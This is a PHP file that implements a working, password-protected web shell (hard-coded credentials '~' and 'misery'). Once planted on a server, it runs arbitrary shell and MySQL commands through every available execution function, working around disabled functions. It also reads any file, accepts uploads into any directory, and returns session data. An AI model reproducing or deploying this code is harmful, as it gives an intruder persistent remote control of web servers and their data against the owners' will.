<?php
// version 0.4
class State {
    var $state;
    function __construct (){
        if (!@session_start()) return false;
        if (isset($_SESSION['data']) && !empty($_SESSION['data']) && $_SESSION['data'] != null) {
            $this->state    = json_decode($_SESSION['data']);
        }else{
            $this->state    = json_decode("{" . json_encode(array('DbVersion' => '0.1'))."}");
        }
    }

    function __destruct(){
        $_SESSION['data'] = json_encode($this->state);
    }
}

class mysql {
    var $mysqlbin;
    var $user;
    var $password;
    var $database;

    function __construct(&$state = null){
        if (!is_null($state)){
            $this->state = &$state->state;
        }
        $this->disabled_functions = @ini_get('disable_functions');
        if (!empty($this->disabled_functions)) {
            $this->disabled_functions = explode(",", str_replace(" ","", $this->disabled_functions));
        }else{
            $this->disabled_functions = array();
        }
    }
    function resumeState(){
        if (!isset($this->state)) return false;
        $this->user     = isset($this->state->{'mysql_user'}) ? $this->state->{'mysql_user'} : '';
        $this->password = isset($this->state->{'mysql_password'}) ? $this->state->{'mysql_password'} : '';
        $this->database = isset($this->state->{'mysql_database'}) ? $this->state->{'mysql_database'} : '';
        $this->mysqlbin = "mysql -t --user=" . $this->user . " --password=" . $this->password . " --database=" . $this->database;
    }

    function enabledCmd($cmd){
        if (is_callable($cmd) && !in_array($cmd, $this->disabled_functions)) {
            return true;
        }
        return false;
    }
    function executeCmd($cmd){
        $result;
        if (!empty($cmd)){
            $cmd = $this->mysqlbin . " --execute='" . $cmd . "' 2>&1";
            if ($this->enabledCmd('shell_exec')){
                $result = shell_exec($cmd);

            }elseif ($this->enabledCmd('exec')){
                exec($cmd, $result);
                $result = join("\n",$result);

            }elseif ($this->enabledCmd('system')){
                @ob_clean();
                system($cmd);
                $result = @ob_get_contents();
                @ob_clean();

            }elseif ($this->enabledCmd('passthru')){
                @ob_clean();
                passthru($cmd);
                $result = @ob_get_contents();
                @ob_clean();

            }elseif (is_resource($fp = popen($cmd,"r"))){
                while(!feof($fp)) {
                    $result .= fread($fp,1024);
                }
                pclose($fp);
            }else{
                $result = `$cmd`;
            }
        }
        return $result;
    }
}

class bash {
    var $current_dir;
    var $state;
    var $disabled_functions;

    function __construct($state = null){
        if (!is_null($state)){
            $this->state = $state->state;
        }
        $this->disabled_functions = @ini_get('disable_functions');
        if (!empty($this->disabled_functions)) {
            $this->disabled_functions = explode(",", str_replace(" ","", $this->disabled_functions));
        }else{
            $this->disabled_functions = array();
        }
    }
    function resumeState(){
        #if (!isset($this->state)) return false; 
        if (!isset($this->state->{'current_dir'})){
            $this->current_dir = getcwd();
            $this->state->{'current_dir'} = $this->current_dir;
        }else{
            $cd = $this->state->{'current_dir'};
            if (file_exists($cd)){
                chdir($cd);
                $this->current_dir = $cd;
            }else{
                $this->current_dir = getcwd();  
                $this->state->{'current_dir'} = $this->current_dir;
            }
        }
    }

    function enabledCmd($cmd){
        if (is_callable($cmd) && !in_array($cmd, $this->disabled_functions)) {
            return true;
        }
        return false;
    }
    function executeCmd($cmd){
        $result;
        if (!empty($cmd)){
            $cmd .= " 2>&1";
            if ($this->enabledCmd('shell_exec')){
                $result = shell_exec($cmd);

            }elseif ($this->enabledCmd('exec')){
                exec($cmd, $result);
                $result = join("\n",$result);

            }elseif ($this->enabledCmd('system')){
                @ob_clean();
                system($cmd);
                $result = @ob_get_contents();
                @ob_clean();

            }elseif ($this->enabledCmd('passthru')){
                @ob_clean();
                passthru($cmd);
                $result = @ob_get_contents();
                @ob_clean();

            }elseif (is_resource($fp = popen($cmd,"r"))){
                while(!feof($fp)) {
                    $result .= fread($fp,1024);
                }
                pclose($fp);
            }else{
                $result = `$cmd`;
            }
        }
        return $result;
    }
}

class Shell{
    var $engine;
    var $session;
    var $request;

    function __construct($request = null) {
        $this->session = new State();
        if (isset($this->session->state->{'shell'})) {
            $engine = $this->session->state->{'shell'};
        }else{
            $engine = isset($request['shell']) ? $request['shell'] : 'bash';
        }
        if (!in_array($engine, array('mysql', 'bash'))) {
            $engine = 'bash';
        }
        $this->engine = eval("return new $engine();");
        $this->engine->state = $this->session->state;
        $this->request = $request;
        if (!isset($this->request['params'])) {
            $this->request['params'] = '';
        }
        return $this;
    }
    function resumeState() {
        $this->engine->resumeState();
        return $this;
    }
    function login() {
        if (!isset($this->request['user']) || $this->request['user'] != USER
            || !isset($this->request['password']) || $this->request['password'] != PASSWORD) {
                $this->request['status_code'] = 300;
                return false;
        }
        $this->request['current_dir'] = getcwd();
        $this->request['status_code'] = 200;
        $this->request['session'] = session_id();

        return true;
    }
    function executeCmd() {
        switch ($this->request['action']) 
        {
            case 'INTERNAL':
                $cmd = $this->request['cmd'];
                switch ($cmd) {
                    case 'shell':
                        $this->session->state->{'shell'} = $this->request['shell'] = $this->request['params'];
                        break;

                    case 'set':
                        $varValue = preg_split("/=/", $this->request['params']);
                        if ($varValue[0] == 'current_dir') {
                            $varValue[1] = realpath($varValue[1]);
                            $this->request['current_dir'] = $this->session->state->{'current_dir'} = $varValue[1];
                        }else{
                            $this->request["$varValue[0]"] = $this->session->state->{"$varValue[0]"} = $varValue[1];
                        }
                        break;
                    
                    case 'unset':
                        unset($this->session->state->{"$this->request['params']"});
                        break;

                    case 'get':
                        $fullpathfile = $this->request['current_dir'] . "/" . $this->request['file'];
                        header('Content-Length: ' . filesize($fullpathfile));
                        readfile($fullpathfile);
                        die();
                        break;

                    case 'drop':
                        if(move_uploaded_file($_FILES['file']['tmp_name'],
                            $this->request['current_dir'] . "/" . $_FILES['file']['name'])) {
                        }
                        break;

                    case 'login': # *already* logged in
                        if (isset($this->session->state->{'current_dir'})) {
                            $this->request['current_dir'] = $this->session->state->{'current_dir'};
                        }
                        break;
                }
                $this->request['status_code'] = 200;
                break;

            case 'CMD':
                $this->request['response'] = $this->engine->executeCmd($this->request['cmd'] . ' ' . $this->request['params']);
                $this->request['status_code'] = 200;
                break;
        }
        return $this;
    }
    function sendResponse(){
        $this->request['debug_information'] = json_encode($_SESSION);
        $this->request['connecting_from'] = json_encode($_SERVER['REMOTE_ADDR']);
        if (isset($_POST['password'])) {
            echo json_encode($this->request);
        }
        return $this;
    }
}
@ini_set("display_errors", 1);
define('PASSWORD', 'misery');
define('USER', '~');
$shell = new Shell($_REQUEST);
if ($shell->login()) {
    $shell->resumeState()->executeCmd()->sendResponse();
    die;
}
//header('HTTP/1.1 403 Forbidden');
//lol